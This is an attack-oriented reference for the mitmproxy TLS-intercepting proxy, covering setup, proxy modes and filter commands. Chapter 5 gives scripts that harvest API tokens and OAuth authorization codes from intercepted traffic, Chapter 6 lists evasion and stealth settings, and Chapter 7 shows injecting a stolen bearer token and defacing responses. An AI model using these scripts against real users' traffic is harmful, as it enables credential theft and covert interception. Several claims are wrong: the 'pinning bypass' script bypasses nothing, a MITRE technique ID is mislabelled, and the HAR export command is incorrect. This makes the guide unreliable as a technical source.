---
mitre_tactic: collection
mitre_tactic_id: TA0009
tool_name: mitmproxy
tool_category: HTTP/HTTPS Proxy
github: https://github.com/mitmproxy/mitmproxy
version: 12.2.3
license: MIT
language: Python
---

# mitmproxy - Interactive TLS-Capable Intercepting HTTP Proxy

## Chapter 1: Overview

mitmproxy is a comprehensive, feature-rich man-in-the-middle proxy for HTTP/1, HTTP/2, and WebSockets traffic. It provides three interfaces: a console UI (mitmproxy), a command-line tool (mitmdump), and a web interface (mitmweb).

**Core Function:** Intercept, inspect, modify, and replay HTTP/HTTPS traffic

**Primary Use Cases:**
- Web application security testing
- API debugging and analysis
- Traffic manipulation and replay
- Certificate pinning bypass
- Mobile application traffic inspection
- Automated traffic modification via scripts

**Key Capabilities:**
- SSL/TLS interception with on-the-fly certificate generation
- HTTP/1, HTTP/2, and WebSocket support
- Scriptable via Python addons
- Flow recording and replay
- Transparent proxy mode
- Reverse proxy mode
- SOCKS5 proxy support
- WireGuard integration

**Three Interfaces:**
- **mitmproxy**: Interactive console UI
- **mitmdump**: Command-line version (tcpdump for HTTP)
- **mitmweb**: Browser-based web interface

---

## Chapter 2: Installation

### Kali Linux (Default)

```bash
sudo apt install mitmproxy
```

### From PyPI

```bash
pip install mitmproxy
```

### Verify Installation

```bash
mitmproxy --version
mitmdump --version
mitmweb --version
```

### Install CA Certificate

```bash
# After first run, install the CA certificate
# Certificate location: ~/.mitmproxy/mitmproxy-ca-cert.pem

# Linux (system-wide)
sudo cp ~/.mitmproxy/mitmproxy-ca-cert.pem /usr/local/share/ca-certificates/mitmproxy.crt
sudo update-ca-certificates

# Firefox (manual)
# Settings > Privacy & Security > Certificates > View Certificates
# Import ~/.mitmproxy/mitmproxy-ca-cert.pem
```

---

## Chapter 3: Architecture and Operation

### Proxy Modes

```
┌─────────────────────────────────────────────────────────────────┐
│                      mitmproxy Modes                            │
├─────────────────────────────────────────────────────────────────┤
│  Regular HTTP Proxy    │ Browser/app configured to use proxy   │
│  Transparent Proxy     │ Network traffic redirected via NAT    │
│  Reverse Proxy         │ Proxy as if it were the server        │
│  SOCKS5 Proxy          │ SOCKS5 protocol support               │
│  Upstream Proxy        │ Forward to another proxy              │
│  WireGuard             │ VPN-based interception                │
└─────────────────────────────────────────────────────────────────┘
```

### MITRE ATT&CK Mapping

| Technique | ID | Description |
|-----------|-----|-------------|
| Man-in-the-Middle | T1557 | Intercept communications |
| Network Sniffing | T1040 | Capture network traffic |
| Web Service | T1583.006 | Compromise web infrastructure |

### SSL/TLS Interception Flow

```
1. Client → mitmproxy: HTTPS connection (ClientHello)
2. mitmproxy → Server: Forward ClientHello
3. Server → mitmproxy: ServerHello + Certificate
4. mitmproxy: Generate forged certificate for target domain
5. mitmproxy → Client: Forged certificate
6. Client → mitmproxy: Encrypted request (using forged cert)
7. mitmproxy: Decrypt, inspect, modify
8. mitmproxy → Server: Forward request (re-encrypted)
```

---

## Chapter 4: Command Reference

### Basic Proxy Startup

```bash
# Console UI on default port 8080
mitmproxy

# Command-line version
mitmdump

# Web interface
mitmweb
```

**Explanation:** Start mitmproxy with the respective interface. Default listen port is 8080.

### Custom Port

```bash
mitmproxy -p 8888
mitmdump -p 8888
mitmweb --web-port 8081 -p 8888
```

**Explanation:** Start proxy on custom port 8888, mitmweb on port 8081.

### Transparent Proxy Mode

```bash
mitmproxy --mode transparent
mitmdump --mode transparent
```

**Explanation:** Start in transparent proxy mode. Requires iptables/nftables redirection.

### Set Up Transparent Proxy (Linux)

```bash
# Redirect HTTP traffic
sudo iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 80 \
  -j REDIRECT --to-port 8080

# Redirect HTTPS traffic
sudo iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 443 \
  -j REDIRECT --to-port 8080

# Start mitmproxy in transparent mode
mitmproxy --mode transparent
```

### Reverse Proxy Mode

```bash
mitmproxy --mode reverse:https://target.local
```

**Explanation:** Act as reverse proxy, forwarding traffic to target.local.

### SOCKS5 Proxy

```bash
mitmproxy --mode socks5
```

**Explanation:** Start as SOCKS5 proxy for applications supporting SOCKS.

### Save Flows to File

```bash
mitmdump -w traffic.flow
mitmdump -w +traffic_%.flow  # New file per timestamp
```

**Explanation:** Record all traffic to a file for later analysis.

### Read Flows from File

```bash
mitmdump -r traffic.flow
mitmproxy -r traffic.flow
```

**Explanation:** Replay or analyze previously recorded traffic.

### Execute Scripts

```bash
mitmdump -s modify_request.py
mitmproxy -s inject_payload.py
```

**Explanation:** Execute Python addon scripts for traffic modification.

### Ignore Hosts

```bash
mitmdump --ignore-hosts "^(?!.*target\.local)"
mitmproxy --ignore-hosts "192\.168\.1\.100"
```

**Explanation:** Forward traffic without interception for specified hosts.

### Custom Certificates

```bash
mitmdump --certs "*.target.local=cert.pem"
```

**Explanation:** Use custom certificate for specific domain.

### Filter Expressions

```bash
# Show only POST requests
mitmproxy --intercept "~m POST"

# Show only specific domain
mitmproxy --view-filter "~d api.target.local"

# Show only 4xx/5xx responses
mitmproxy --view-filter "~s [45]"
```

**Explanation:** Filter traffic display using mitmproxy filter syntax.

---

## Chapter 5: Advanced Attack Scenarios

### Scenario 1: API Token Extraction

**Setup:**

```bash
# Create script to extract tokens
cat > extract_tokens.py << 'EOF'
from mitmproxy import http
import json

def response(flow: http.HTTPFlow):
    if "token" in flow.response.text.lower():
        data = json.loads(flow.response.text)
        print(f"[+] Token found: {data.get('token', 'N/A')}")
        with open("tokens.txt", "a") as f:
            f.write(f"{flow.request.url} -> {data}\n")
EOF

# Run with script
mitmdump -s extract_tokens.py -w api_traffic.flow
```

**Explanation:** Intercept API responses and extract authentication tokens.

### Scenario 2: OAuth Code Interception

**Setup:**

```bash
# Script to capture OAuth codes
cat > oauth_capture.py << 'EOF'
from mitmproxy import http

def request(flow: http.HTTPFlow):
    if "authorization_code" in flow.request.url:
        print(f"[+] OAuth Code: {flow.request.url}")
        with open("oauth_codes.txt", "a") as f:
            f.write(f"{flow.request.url}\n")
EOF

# Start proxy
mitmdump -s oauth_capture.py -p 8080
```

**Explanation:** Intercept OAuth authorization codes during authentication flow.

### Scenario 3: Mobile App Traffic Analysis

**Setup:**

```bash
# Start mitmweb for visual inspection
mitmweb --web-port 8081 -p 8080

# Configure mobile device proxy to attacker:8080
# Install mitmproxy CA certificate on device
# Capture and analyze app traffic
```

**Explanation:** Use mitmweb for easy visual inspection of mobile application traffic.

### Scenario 4: Certificate Pinning Bypass

**Setup:**

```bash
# Script to bypass certificate pinning
cat > bypass_pinning.py << 'EOF'
from mitmproxy import http
from mitmproxy.certutils import CA

def tls_clienthello(data):
    # Log connection attempts
    print(f"[+] TLS ClientHello to {data.address}")
EOF

mitmdump -s bypass_pinning.py --ssl-insecure
```

**Explanation:** Bypass certificate pinning by using --ssl-insecure flag.

---

## Chapter 6: Detection and Evasion

### Detection Methods

- **Certificate Transparency:** Monitor for unexpected certificate issuances
- **SSL Pinning Logs:** Check for certificate validation failures
- **Network Monitoring:** Detect proxy connections on port 8080
- **Browser Console:** SSL/TLS warnings in developer tools

### Evasion Techniques

1. **Custom Certificates:** Use domain-specific certs with `--certs`
2. **Port Randomization:** Use non-standard ports
3. **Host Filtering:** Use `--ignore-hosts` to avoid detection
4. **Quiet Mode:** Use `-q` to minimize logging

### Stealth Configuration

```bash
# Quiet mode with custom cert
mitmdump -q --certs "*.target.local=real_cert.pem" -p 8443

# Ignore non-target traffic
mitmdump --ignore-hosts "^(?!.*target\.local)"
```

---

## Chapter 7: Scripting and Automation

### Python Addon Structure

```python
from mitmproxy import http

def request(flow: http.HTTPFlow):
    """Modify outgoing requests"""
    flow.request.headers["X-Custom-Header"] = "value"

def response(flow: http.HTTPFlow):
    """Modify incoming responses"""
    flow.response.text = flow.response.text.replace("old", "new")

def error(flow: http.HTTPFlow):
    """Handle errors"""
    print(f"Error: {flow.error}")
```

### Common Script Patterns

```bash
# Header injection
mitmdump -s inject_headers.py

# Response modification
mitmdump -s modify_response.py

# Traffic logging
mitmdump -s log_traffic.py -w logs.flow

# Automated testing
mitmdump -s test_script.py -r recorded.flow
```

### Script Examples

**Header Injection:**

```python
from mitmproxy import http

def request(flow: http.HTTPFlow):
    flow.request.headers["Authorization"] = "Bearer stolen_token"
```

**Response Replacement:**

```python
from mitmproxy import http

def response(flow: http.HTTPFlow):
    if "target.com" in flow.request.url:
        flow.response.content = b"<h1>Compromised</h1>"
```

---

## Chapter 8: Troubleshooting

### Common Issues

**Issue:** Certificate errors in browser

```bash
# Install mitmproxy CA certificate
# Location: ~/.mitmproxy/mitmproxy-ca-cert.pem

# For system-wide (Linux)
sudo cp ~/.mitmproxy/mitmproxy-ca-cert.pem /usr/local/share/ca-certificates/mitmproxy.crt
sudo update-ca-certificates
```

**Issue:** No traffic appearing

```bash
# Check proxy is running
netstat -tlnp | grep 8080

# Verify iptables rules (transparent mode)
sudo iptables -t nat -L -n

# Test proxy directly
curl -x http://localhost:8080 http://example.com
```

**Issue:** HTTPS not intercepting

```bash
# Ensure CA cert is installed
# Check --ssl-insecure flag if needed
mitmdump --ssl-insecure -p 8080

# Verify upstream connection
mitmdump -v -p 8080
```

**Issue:** Script not executing

```bash
# Check script syntax
python -c "import script_name"

# Run with verbose logging
mitmdump -v -s script.py
```

### Debug Mode

```bash
mitmdump -vv -p 8080 2>&1 | tee mitmproxy_debug.log
```

### Flow Analysis

```bash
# Convert flow to HAR format
mitmdump -r traffic.flow -w traffic.har --set hardump=true

# Extract specific flows
mitmdump -r traffic.flow --view-filter "~d api.target.local" -w api_flows.flow
```

---

## Resources

- **GitHub:** https://github.com/mitmproxy/mitmproxy
- **Documentation:** https://docs.mitmproxy.org/
- **Kali Documentation:** https://www.kali.org/tools/mitmproxy/
- **Addons Repository:** https://github.com/mitmproxy/mitmproxy/tree/main/examples
- **Filter Syntax:** https://docs.mitmproxy.org/stable/filters.html
- **Scripting API:** https://docs.mitmproxy.org/stable/addons-requests.html
